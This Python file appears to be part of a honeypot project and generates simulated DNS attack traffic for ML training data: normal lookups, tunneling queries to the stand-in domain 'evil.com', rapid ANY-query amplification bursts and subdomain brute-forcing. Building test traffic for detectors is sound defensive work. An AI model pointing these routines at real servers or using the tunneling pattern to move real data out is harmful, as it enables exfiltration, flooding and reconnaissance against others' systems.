"""
DNS Attack Simulator
====================

This module simulates various DNS-based attacks for testing the DNS honeypot.
Generates traffic patterns for DNS tunneling, amplification, and enumeration.

Usage:
    python attack_simulator_dns.py [dns_server_ip]
    
Educational Purpose:
    Demonstrates how DNS can be abused for data exfiltration and DDoS attacks.
    Used to generate training data for ML model.
"""

import socket
import struct
import time
import random
import string
import sys
import os
from datetime import datetime

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from models.session_models import DNSSession
import importlib.util

# Load attack_logger
_CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
_logger_spec = importlib.util.spec_from_file_location(
    "attack_logger",
    os.path.join(_CURRENT_DIR, "logging", "attack_logger.py"),
)
_attack_logger_mod = importlib.util.module_from_spec(_logger_spec)
_logger_spec.loader.exec_module(_attack_logger_mod)
AttackLogger = _attack_logger_mod.AttackLogger


# ═══════════════════════════════════════════════════════════════════════════
# IP ADDRESS GENERATION
# ═══════════════════════════════════════════════════════════════════════════
def generate_realistic_ip(prefer_repeat=False, repeat_pool=None):
    """
    Generate realistic-looking source IP addresses for simulation.
    
    Args:
        prefer_repeat: If True, 40% chance to return IP from repeat_pool
        repeat_pool: List of IPs to choose from for repeat attacks
    
    Returns:
        str: Random IP address
    """
    # If repeat requested and pool available, sometimes use those
    if prefer_repeat and repeat_pool and random.random() < 0.4:
        return random.choice(repeat_pool)
    
    choice = random.random()
    
    if choice < 0.60:  # Public IPs from various regions
        ranges = [
            (45, 76),    # North America / Europe
            (101, 125),  # Asia Pacific
            (151, 188),  # Global mixed
            (190, 223),  # Various regions
        ]
        first_octet = random.choice([random.randint(r[0], r[1]) for r in ranges])
        return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    
    elif choice < 0.80:  # Cloud provider ranges
        cloud_ranges = [
            (3, 5),      # AWS partial
            (13, 15),    # Microsoft Azure partial
            (34, 35),    # Google Cloud partial
            (52, 54),    # AWS EC2
        ]
        first_octet = random.choice([random.randint(r[0], r[1]) for r in cloud_ranges])
        return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    
    elif choice < 0.90:  # Known suspicious ranges
        suspicious_ranges = [
            (80, 95),    # Eastern Europe
            (176, 178),  # Russia
            (112, 115),  # China
        ]
        first_octet = random.choice([random.randint(r[0], r[1]) for r in suspicious_ranges])
        return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    
    else:  # Residential ISP ranges
        return f"{random.choice([68, 70, 72, 73, 75, 98, 99])}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"


class DNSSimulator:
    """
    Simulate various DNS attack patterns.
    
    Attack Types:
      - Normal lookups: Regular DNS queries
      - DNS Tunneling: Encoded data in subdomains
      - Amplification: ANY queries for DDoS
      - Subdomain enumeration: Brute-force subdomains
    
    Logs all simulated attacks to data/attack_logs.csv for ML training.
    """
    
    def __init__(self, dns_server="127.0.0.1", dns_port=53, log_file=None, repeat_ips=None):
        """
        Initialize DNS attack simulator.
        
        Args:
            dns_server: DNS server IP (honeypot)
            dns_port: DNS port (default 53)
            log_file: Path to CSV log file (default: project's data/attack_logs.csv)
            repeat_ips: List of IPs to sometimes reuse (for cross-attack correlation)
        """
        self.dns_server = dns_server
        self.dns_port = dns_port
        self.repeat_ips = repeat_ips or []
        
        if log_file is None:
            log_file = os.path.join(_CURRENT_DIR, "data", "attack_logs.csv")
        self.logger = AttackLogger(log_file)
        
        print(f"[DNSSimulator] Target DNS: {dns_server}:{dns_port}")
        print(f"[DNSSimulator] Logging to: {log_file}")
    
    def _log_dns(self, attack_type: str, query_count: int, duration: float,
                 tunneling: bool = False, amplification: bool = False):
        """Log a DNS attack session to CSV."""
        query_rate = query_count / duration if duration > 0 else query_count
        
        # Generate source IP (sometimes repeat for correlation)
        source_ip = generate_realistic_ip(prefer_repeat=True, repeat_pool=self.repeat_ips)
        
        # Add timestamp variation (spread attacks over time)
        import datetime as dt
        base_time = dt.datetime.now()
        time_offset = random.randint(-3600, 0)  # Up to 1 hour in the past
        timestamp = (base_time + dt.timedelta(seconds=time_offset)).strftime("%Y-%m-%d %H:%M:%S")
        
        if amplification:
            dns_query = "example.com"
            dns_query_type = "ANY"
        elif tunneling:
            dns_query = "session.tunnel.evil.com"
            dns_query_type = "TXT"
        else:
            dns_query = "normal.lookup.local"
            dns_query_type = "A"

        session = DNSSession(
            ip_address=source_ip,
            dns_query=dns_query,
            dns_query_type=dns_query_type,
            query_rate=round(query_rate, 2),
            tunneling_detected=1 if tunneling else 0,
            amplification_detected=1 if amplification else 0,
            session_duration=round(duration, 2),
            packet_count=query_count,
            timestamp=timestamp,
        )
        
        self.logger.log_session(session)
        print(f"[DNSSimulator] Logged {attack_type} from {source_ip}: {query_count} queries @ {query_rate:.1f} q/s")
    
    def _build_dns_query(self, domain, query_type=1, transaction_id=None):
        """
        Build a DNS query packet.
        
        Args:
            domain: Domain name to query
            query_type: 1=A, 16=TXT, 255=ANY, etc.
            transaction_id: Transaction ID (random if None)
        
        Returns:
            DNS query packet bytes
        """
        if transaction_id is None:
            transaction_id = random.randint(1, 65535)
        
        # DNS Header
        header = struct.pack('>H', transaction_id)  # Transaction ID
        header += struct.pack('>H', 0x0100)  # Flags: Standard query
        header += struct.pack('>HHHH', 1, 0, 0, 0)  # 1 question, 0 answers
        
        # Question section
        question = b''
        for part in domain.split('.'):
            question += bytes([len(part)]) + part.encode('utf-8')
        question += b'\x00'  # Null terminator
        question += struct.pack('>HH', query_type, 1)  # Type, Class IN
        
        return header + question
    
    def _send_query(self, domain, query_type=1):
        """
        Send a DNS query and receive response.
        
        Args:
            domain: Domain to query
            query_type: DNS query type
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            
            query = self._build_dns_query(domain, query_type)
            sock.sendto(query, (self.dns_server, self.dns_port))
            
            # Receive response (ignore for simulation)
            try:
                response, addr = sock.recvfrom(512)
            except socket.timeout:
                pass  # No response is fine for testing
            
            sock.close()
        except Exception as e:
            pass  # Connection errors expected for testing
    
    def normal_lookups(self, count=20):
        """
        Simulate normal DNS lookups.
        
        Characteristics:
          - Common domains
          - A record queries
          - Human-like timing
        
        Args:
            count: Number of queries
        """
        domains = [
            "google.com", "facebook.com", "youtube.com", "amazon.com",
            "wikipedia.org", "twitter.com", "instagram.com", "linkedin.com",
            "reddit.com", "netflix.com", "apple.com", "microsoft.com"
        ]
        
        print(f"\n[NORMAL LOOKUPS] Sending {count} legitimate queries...")
        start_time = time.time()
        
        for i in range(count):
            domain = random.choice(domains)
            self._send_query(domain, query_type=1)  # A record
            time.sleep(random.uniform(0.5, 2.0))  # Human timing
        
        duration = time.time() - start_time
        rate = count / duration
        print(f"[NORMAL LOOKUPS] Complete: {count} queries in {duration:.2f}s ({rate:.2f} q/s)")
        
        # Log this session
        self._log_dns("normal", count, duration, tunneling=False, amplification=False)
    
    def dns_tunneling(self, count=30):
        """
        Simulate DNS tunneling attack.
        
        Characteristics:
          - Long subdomain names (base64-encoded data)
          - TXT or NULL record queries
          - Rapid queries
        
        Args:
            count: Number of tunneling queries
        """
        print(f"\n[DNS TUNNELING] Sending {count} tunneling queries...")
        start_time = time.time()
        
        evil_domain = "evil.com"
        
        for i in range(count):
            # Generate long "encoded" subdomain (simulating data exfiltration)
            data = ''.join(random.choices(string.ascii_lowercase + string.digits, k=40))
            domain = f"{data}.tunnel.{evil_domain}"
            
            # Use TXT queries (common for tunneling)
            query_type = random.choice([16, 10])  # TXT or NULL
            self._send_query(domain, query_type=query_type)
            
            time.sleep(random.uniform(0.1, 0.3))  # Fast but not instant
        
        duration = time.time() - start_time
        rate = count / duration
        print(f"[DNS TUNNELING] Complete: {count} queries in {duration:.2f}s ({rate:.2f} q/s)")
        
        # Log this session
        self._log_dns("tunneling", count, duration, tunneling=True, amplification=False)
    
    def amplification_attack(self, count=50):
        """
        Simulate DNS amplification attack.
        
        Characteristics:
          - ANY queries (largest response)
          - High query rate
          - Same domain repeated
        
        Args:
            count: Number of amplification queries
        """
        print(f"\n[DNS AMPLIFICATION] Sending {count} ANY queries...")
        start_time = time.time()
        
        # Target domain for amplification
        domain = "example.com"
        
        for i in range(count):
            self._send_query(domain, query_type=255)  # ANY query
            time.sleep(0.05)  # Very fast (DDoS characteristic)
        
        duration = time.time() - start_time
        rate = count / duration
        print(f"[DNS AMPLIFICATION] Complete: {count} queries in {duration:.2f}s ({rate:.1f} q/s)")
        
        # Log this session
        self._log_dns("amplification", count, duration, tunneling=False, amplification=True)
    
    def subdomain_enumeration(self, count=40):
        """
        Simulate subdomain enumeration/brute-force.
        
        Characteristics:
          - Predictable subdomain patterns
          - Rapid sequential queries
          - A record queries
        
        Args:
            count: Number of subdomains to enumerate
        """
        subdomains = [
            "www", "mail", "ftp", "admin", "vpn", "portal", "webmail",
            "remote", "smtp", "pop", "imap", "ns1", "ns2", "dev", "staging",
            "test", "api", "cdn", "static", "blog", "shop", "store"
        ]
        
        print(f"\n[SUBDOMAIN ENUM] Enumerating {count} subdomains...")
        start_time = time.time()
        
        target_domain = "target.com"
        
        for i in range(count):
            subdomain = random.choice(subdomains) if i < len(subdomains) else f"sub{i}"
            domain = f"{subdomain}.{target_domain}"
            self._send_query(domain, query_type=1)
            time.sleep(random.uniform(0.1, 0.2))  # Fast enumeration
        
        duration = time.time() - start_time
        rate = count / duration
        print(f"[SUBDOMAIN ENUM] Complete: {count} queries in {duration:.2f}s ({rate:.1f} q/s)")
        
        # Log this session (treated as normal DNS for ML)
        self._log_dns("normal", count, duration, tunneling=False, amplification=False)


def run_simulation_suite(dns_server="127.0.0.1", rounds=3, repeat_ips=None):
    """
    Run a full suite of DNS attack simulations.
    
    Args:
        dns_server: DNS server IP (honeypot)
        rounds: Number of times to run each attack type
        repeat_ips: List of IPs to sometimes reuse for cross-attack correlation
    """
    print("=" * 70)
    print("DNS ATTACK SIMULATOR")
    print("=" * 70)
    print(f"Target DNS Server: {dns_server}:53")
    print(f"Rounds: {rounds} of each attack type")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    simulator = DNSSimulator(dns_server, repeat_ips=repeat_ips)
    
    for round_num in range(1, rounds + 1):
        print(f"\n{'='*70}")
        print(f"ROUND {round_num}/{rounds}")
        print(f"{'='*70}")
        
        # Normal lookups
        simulator.normal_lookups(count=15)
        time.sleep(1)
        
        # DNS Tunneling
        simulator.dns_tunneling(count=25)
        time.sleep(1)
        
        # Amplification
        simulator.amplification_attack(count=40)
        time.sleep(1)
        
        # Subdomain enumeration
        simulator.subdomain_enumeration(count=30)
        time.sleep(1)
    
    print(f"\n{'='*70}")
    print("SIMULATION COMPLETE")
    print(f"Finished: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("Check data/attack_logs.csv for logged DNS attacks")
    print(f"{'='*70}")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="DNS Attack Simulator")
    parser.add_argument("--server", default="127.0.0.1", help="DNS server IP (default: 127.0.0.1)")
    parser.add_argument("--rounds", type=int, default=3, help="Number of rounds (default: 3)")
    parser.add_argument("--auto", action="store_true", help="Auto-start without prompt")
    
    args = parser.parse_args()
    
    print("\nNOTE: Run the DNS honeypot first (requires Administrator/root):")
    print("  python honeypot/dns_honeypot.py")
    print("\nOr integrate with honeypot_manager.py when ready.\n")
    
    if not args.auto:
        input("Press Enter to start simulation...")
    
    run_simulation_suite(dns_server=args.server, rounds=args.rounds)
